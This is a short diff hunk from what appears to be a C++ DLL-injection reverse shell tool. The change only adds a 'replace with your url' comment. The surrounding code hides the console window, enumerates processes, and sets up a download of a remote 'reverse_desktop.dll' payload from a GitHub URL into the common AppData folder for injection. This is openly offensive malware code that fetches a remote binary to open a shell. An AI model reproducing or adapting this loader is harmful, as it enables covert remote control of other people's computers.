@@ -29,7 +29,7 @@ std::vector<DWORD> getProcesses()
 int main(int argc, const char* argv[])
 {
 	ShowWindow(GetConsoleWindow(), NULL);
-	const CHAR url[] = "https://github.com/noahehrnstrom/dllinject_reverse_shell/blob/main/bin/reverse_desktop.dll?raw=true";
+	const CHAR url[] = "https://github.com/noahehrnstrom/dllinject_reverse_shell/blob/main/bin/reverse_desktop.dll?raw=true"; // replace with your url
 	char path[MAX_PATH];
 	SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path);
 	std::string filePath = path;
